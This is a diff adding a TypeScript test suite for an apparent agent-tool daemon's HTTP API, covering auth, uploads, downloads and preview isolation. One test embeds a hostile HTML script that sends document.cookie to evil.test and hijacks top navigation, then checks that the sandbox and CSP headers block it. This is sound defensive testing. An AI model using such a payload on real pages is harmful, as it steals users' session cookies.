@@ -1,0 +1,355 @@
+import { mkdtempSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import { ARTIFACT_LIMITS, ATTACHMENT_LIMITS } from '@agentdev/contracts';
+import { createDaemon, listen, parseMultipart } from '../src/index.js';
+import {
+  ArtifactService,
+  AttachmentService,
+  AuthService,
+  DownloadTokenStore,
+  PREVIEW_CSP,
+  PREVIEW_SANDBOX,
+} from '@agentdev/core';
+import {
+  BlobStore,
+  ProjectStore as Store,
+  projectIdFromRoot,
+  type ProjectStore,
+} from '@agentdev/storage';
+import type { Server } from 'node:http';
+
+const ROOT = '/tmp/agentdev-daemon-root';
+const CONVERSATION_ID = '018f2c1e-9a4b-7c3d-8e5f-0a1b2c3d5f01';
+
+describe('daemon HTTP surface (WP-03)', () => {
+  let dataDir: string;
+  let stateDir: string;
+  let store: ProjectStore;
+  let blobs: BlobStore;
+  let attachments: AttachmentService;
+  let artifacts: ArtifactService;
+  let server: Server;
+  let url: string;
+  let close: () => Promise<void>;
+  let token: string;
+  let projectId: string;
+
+  beforeEach(async () => {
+    dataDir = mkdtempSync(join(tmpdir(), 'agentdev-daemon-'));
+    stateDir = mkdtempSync(join(tmpdir(), 'agentdev-daemon-auth-'));
+    store = Store.open({
+      dataDir,
+      canonicalRoot: ROOT,
+      migrations: { backup: () => undefined, backupPath: join(dataDir, 'pre.sqlite') },
+    });
+    blobs = new BlobStore({ root: dataDir });
+    attachments = new AttachmentService({ store, blobs });
+    artifacts = new ArtifactService({ store, blobs });
+    projectId = projectIdFromRoot(ROOT);
+    store.projects.insert({
+      id: projectId,
+      root: ROOT,
+      codeRoot: 'src',
+      documentRoot: 'docs',
+      deliveryBranch: 'agentdev/main',
+      trust: 'trusted',
+      state: 'open',
+    });
+    store.conversations.insert({
+      id: CONVERSATION_ID,
+      projectId,
+      title: 'chief',
+      archived: false,
+    });
+    const auth = AuthService.loadOrCreate({ stateDir });
+    token = auth.createdToken as string;
+    server = createDaemon({
+      projectId,
+      store,
+      auth,
+      attachments,
+      artifacts,
+      tokens: new DownloadTokenStore(),
+      version: '0.0.0-test',
+    });
+    const started = await listen(server, { port: 0 });
+    url = started.url;
+    close = started.close;
+  });
+
+  afterEach(async () => {
+    await close();
+    store.close();
+    rmSync(dataDir, { recursive: true, force: true });
+    rmSync(stateDir, { recursive: true, force: true });
+  });
+
+  function authed(init: RequestInit = {}): RequestInit {
+    return { ...init, headers: { authorization: `Bearer ${token}`, ...(init.headers ?? {}) } };
+  }
+
+  async function upload(content: string, mime = 'text/html', filename = 'note.html') {
+    const form = new FormData();
+    form.set('conversationId', CONVERSATION_ID);
+    form.set('file', new Blob([content], { type: mime }), filename);
+    return fetch(`${url}/artifacts/upload`, authed({ method: 'POST', body: form }));
+  }
+
+  it('answers /healthz without authentication and without leaking paths', async () => {
+    const response = await fetch(`${url}/healthz`);
+    expect(response.status).toBe(200);
+    const body = (await response.json()) as Record<string, unknown>;
+    expect(body).toEqual({ version: '0.0.0-test', ready: true });
+    expect(JSON.stringify(body)).not.toContain(dataDir);
+  });
+
+  it('refuses unauthenticated requests (AC-084)', async () => {
+    const response = await fetch(`${url}/artifacts/upload`, { method: 'POST' });
+    expect(response.status).toBe(401);
+    const wrong = await fetch(
+      `${url}/artifacts/upload`,
+      authed({ method: 'POST', headers: { authorization: 'Bearer nope' } }),
+    );
+    expect(wrong.status).toBe(401);
+  });
+
+  it('uploads, binds and previews an HTML explanation end to end (AC-002/AC-084)', async () => {
+    const uploadResponse = await upload('<html><body><h1>explain</h1></body></html>');
+    expect(uploadResponse.status).toBe(201);
+    const uploaded = (await uploadResponse.json()) as { attachmentId: string; mime: string };
+    expect(uploaded.mime).toBe('text/html');
+
+    const send = await fetch(
+      `${url}/conversation.message.send`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json', 'idempotency-key': 'msg-1' },
+        body: JSON.stringify({
+          conversationId: CONVERSATION_ID,
+          body: 'please explain the routing rules as HTML',
+          attachmentIds: [uploaded.attachmentId],
+        }),
+      }),
+    );
+    expect(send.status).toBe(202);
+    const sent = (await send.json()) as { messageId: string; workId: string };
+    expect(sent.workId).toMatch(/^[0-9a-f-]{36}$/u);
+
+    // The Work exists, the attachment is bound and a user artifact was created.
+    expect(store.works.find(sent.workId)).toMatchObject({ intent: 'assist', level: 'none' });
+    expect(store.attachments.find(uploaded.attachmentId)).toMatchObject({
+      state: 'bound',
+      workId: sent.workId,
+    });
+    const userArtifacts = artifacts
+      .list(sent.workId)
+      .filter((artifact) => artifact.origin === 'user');
+    expect(userArtifacts).toHaveLength(1);
+    expect(
+      store.events
+        .readAfter(0, { limit: 100 })
+        .filter((event) => event.name === 'message.received'),
+    ).toHaveLength(1);
+
+    // No Requirement or Gate was created by a plain question.
+    expect(store.requirements.list()).toHaveLength(0);
+
+    // The replayed send returns the original binding and creates nothing new.
+    const replay = await fetch(
+      `${url}/conversation.message.send`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json', 'idempotency-key': 'msg-1' },
+        body: JSON.stringify({
+          conversationId: CONVERSATION_ID,
+          body: 'please explain the routing rules as HTML',
+          attachmentIds: [uploaded.attachmentId],
+        }),
+      }),
+    );
+    expect(replay.status).toBe(202);
+    expect(await replay.json()).toEqual(sent);
+    expect(store.messages.list()).toHaveLength(1);
+
+    // Preview carries the isolation policy, not the workbench cookie.
+    const preview = await fetch(`${url}/artifacts/${userArtifacts[0]?.id ?? ''}/preview`, authed());
+    expect(preview.status).toBe(200);
+    expect(preview.headers.get('content-security-policy')).toBe(PREVIEW_CSP);
+    expect(preview.headers.get('x-agentdev-preview-sandbox')).toBe(PREVIEW_SANDBOX);
+    expect(preview.headers.get('x-agentdev-preview-credentials')).toBe('omit');
+    expect(preview.headers.get('set-cookie')).toBeNull();
+    expect(await preview.text()).toContain('explain');
+  });
+
+  it('serves a preview of a hostile document under the same isolation (AC-052)', async () => {
+    const hostile =
+      '<script>fetch("https://evil.test/"+document.cookie);parent.postMessage("x","*");' +
+      'top.location="https://evil.test";</script>';
+    const uploadResponse = await upload(hostile);
+    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
+    await fetch(
+      `${url}/conversation.message.send`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          conversationId: CONVERSATION_ID,
+          body: 'look at this',
+          attachmentIds: [uploaded.attachmentId],
+        }),
+      }),
+    );
+    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
+    if (artifact === undefined) throw new Error('no user artifact');
+    const preview = await fetch(`${url}/artifacts/${artifact.id}/preview`, authed());
+    expect(preview.status).toBe(200);
+    const csp = preview.headers.get('content-security-policy') ?? '';
+    const sandbox = preview.headers.get('x-agentdev-preview-sandbox') ?? '';
+    // The attack vector is closed by policy: no network, no same-origin, no top
+    // navigation and no parent access.
+    expect(csp).toContain("connect-src 'none'");
+    expect(csp).toContain("default-src 'none'");
+    expect(sandbox).not.toContain('allow-same-origin');
+    expect(sandbox).not.toContain('allow-top-navigation');
+    expect(sandbox).not.toContain('allow-popups');
+    expect(preview.headers.get('x-agentdev-preview-credentials')).toBe('omit');
+  });
+
+  it('rejects unsupported and oversized uploads server-side (AC-076)', async () => {
+    const bad = await upload('binary', 'application/zip', 'app.zip');
+    expect(bad.status).toBe(400);
+    const badBody = (await bad.json()) as { error: { code: string } };
+    expect(badBody.error.code).toBe('VALIDATION_ERROR');
+
+    const huge = await upload('x'.repeat(ATTACHMENT_LIMITS.maxBytesEach + 1), 'text/plain');
+    expect(huge.status).toBe(400);
+
+    // A refused upload leaves no attachment row and no blob reference.
+    expect(store.attachments.list()).toHaveLength(0);
+  });
+
+  it('consumes a download token once and then refuses it (AC-002)', async () => {
+    const content = '<p>download me</p>';
+    const uploadResponse = await upload(content, 'text/plain');
+    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
+    const send = await fetch(
+      `${url}/conversation.message.send`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          conversationId: CONVERSATION_ID,
+          body: 'download this',
+          attachmentIds: [uploaded.attachmentId],
+        }),
+      }),
+    );
+    await send.json();
+    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
+    if (artifact === undefined) throw new Error('no user artifact');
+
+    const prepare = await fetch(
+      `${url}/artifacts/download.prepare`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ artifactId: artifact.id }),
+      }),
+    );
+    expect(prepare.status).toBe(200);
+    const grant = (await prepare.json()) as { downloadToken: string; expiresAt: string };
+    expect(Date.parse(grant.expiresAt)).toBeGreaterThan(Date.now());
+
+    const download = await fetch(`${url}/artifacts/download/${grant.downloadToken}`);
+    expect(download.status).toBe(200);
+    expect(download.headers.get('content-disposition')).toContain('attachment');
+    expect(await download.text()).toBe(content);
+
+    const replay = await fetch(`${url}/artifacts/download/${grant.downloadToken}`);
+    expect(replay.status).toBe(403);
+  });
+
+  it('deletes only staged uploads and refuses bound ones (AC-084)', async () => {
+    const uploadResponse = await upload('<p>x</p>', 'text/plain');
+    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
+    const removed = await fetch(`${url}/artifacts/uploads/${uploaded.attachmentId}`, {
+      method: 'DELETE',
+      headers: { authorization: `Bearer ${token}` },
+    });
+    expect(removed.status).toBe(200);
+    expect(store.attachments.find(uploaded.attachmentId)?.state).toBe('expired');
+
+    const second = (await (await upload('<p>y</p>', 'text/plain')).json()) as {
+      attachmentId: string;
+    };
+    await fetch(
+      `${url}/conversation.message.send`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          conversationId: CONVERSATION_ID,
+          body: 'bound now',
+          attachmentIds: [second.attachmentId],
+        }),
+      }),
+    );
+    const refused = await fetch(`${url}/artifacts/uploads/${second.attachmentId}`, {
+      method: 'DELETE',
+      headers: { authorization: `Bearer ${token}` },
+    });
+    expect(refused.status).toBe(400);
+  });
+
+  it('parses multipart bodies without a framework dependency', () => {
+    const boundary = 'agentdev-boundary';
+    const body = Buffer.from(
+      [
+        `--${boundary}`,
+        'Content-Disposition: form-data; name="conversationId"',
+        '',
+        CONVERSATION_ID,
+        `--${boundary}`,
+        'Content-Disposition: form-data; name="file"; filename="a.html"',
+        'Content-Type: text/html',
+        '',
+        '<p>hi</p>',
+        `--${boundary}--`,
+        '',
+      ].join('\r\n'),
+      'utf8',
+    );
+    const parsed = parseMultipart(body, `multipart/form-data; boundary=${boundary}`);
+    expect(parsed.fields['conversationId']).toBe(CONVERSATION_ID);
+    expect(parsed.file?.mime).toBe('text/html');
+    expect(parsed.file?.bytes.toString('utf8')).toBe('<p>hi</p>');
+  });
+
+  it('truncates a preview past the inline limit and keeps it downloadable (AC-002)', async () => {
+    const long = Array.from(
+      { length: ARTIFACT_LIMITS.inlinePreviewMaxLines + 50 },
+      (_, i) => `line-${i}`,
+    ).join('\n');
+    const uploadResponse = await upload(long, 'text/plain');
+    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
+    await fetch(
+      `${url}/conversation.message.send`,
+      authed({
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          conversationId: CONVERSATION_ID,
+          body: 'long one',
+          attachmentIds: [uploaded.attachmentId],
+        }),
+      }),
+    );
+    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
+    if (artifact === undefined) throw new Error('no user artifact');
+    const preview = await fetch(`${url}/artifacts/${artifact.id}/preview`, authed());
+    expect(preview.status).toBe(200);
+    expect((await preview.text()).split('\n')).toHaveLength(ARTIFACT_LIMITS.inlinePreviewMaxLines);
+  });
+});
